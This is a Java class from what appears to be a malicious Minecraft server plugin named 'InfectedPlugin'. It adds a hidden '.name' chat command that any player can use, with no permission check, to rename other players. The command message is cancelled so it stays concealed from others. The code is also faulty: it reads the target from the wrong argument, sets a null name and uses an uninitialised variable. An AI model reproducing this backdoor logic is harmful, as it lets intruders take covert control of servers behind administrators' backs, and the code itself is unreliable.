package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_name extends IP_Command implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        boolean cancel = false;
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
            
            if (args[0].equalsIgnoreCase(".name"))
            {
                if (args.length == 0)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .name <player> <name>");
                }
                
                Player target;
                try
                {
                    target = getPlayer(args[0]);
                }
                catch (PlayerNotFoundException ex)
                {
                    p.sendMessage(ChatColor.RED + ex.getMessage());
                }
                
                String name = null;
                if (args.length >= 2)
                {
                    target.setDisplayName(name);
                    target.setCustomName(name);
                    target.setCustomNameVisible(true);
                }
                else
                {
                    p.sendMessage(ChatColor.RED + "Usage: .name <player> <name>");
                }
                cancel = true;
            }
        }
        
        if (cancel)
        {
            event.setCancelled(true);
            return;
        }
    }
}
